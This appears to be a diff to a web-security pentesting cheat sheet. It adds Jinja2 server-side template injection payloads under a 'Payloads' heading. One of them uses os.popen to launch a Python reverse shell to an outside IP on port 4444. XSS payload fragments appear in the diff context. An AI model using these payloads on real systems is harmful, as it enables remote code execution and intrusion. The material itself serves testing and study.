@@ -228,6 +228,15 @@ java%0d%0ascript%0d%0a:alert(0), j%0d%0aava%0d%0aas%0d%0acrip%0d%0at%0d%0a:confi
 - <https://portswigger.net/research/server-side-template-injection>
 - Diff Template related: Server-Side Template Injection: RCE for the modern webapp: <https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf>
 
+- Payloads:
+  - Jinja2
+    ```js
+    {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']}}{%endif%}{% endfor%}
+    ```
+    ```js
+    {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"1 92.90.172.2\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\"]);'")}}{%endif%}{% endfor %}
+    ```
+
 ### Client Side Attacks 
 
 #### XSS
@@ -511,6 +520,9 @@ wfuzz -z \
 - Damn Vulnerable Serverless Application: <https://www.owasp.org/index.php/OWASP_DVSA>
   - <https://serverlessrepo.aws.amazon.com/applications/arn:aws:serverlessrepo:us-east-1:889485553959:applications~DVSA>
 
+## 
+
+- Login, registration, change password, change email, confirmation of email update
 ## Pending References
 
 - Breaking Parser Logic!: <https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf>
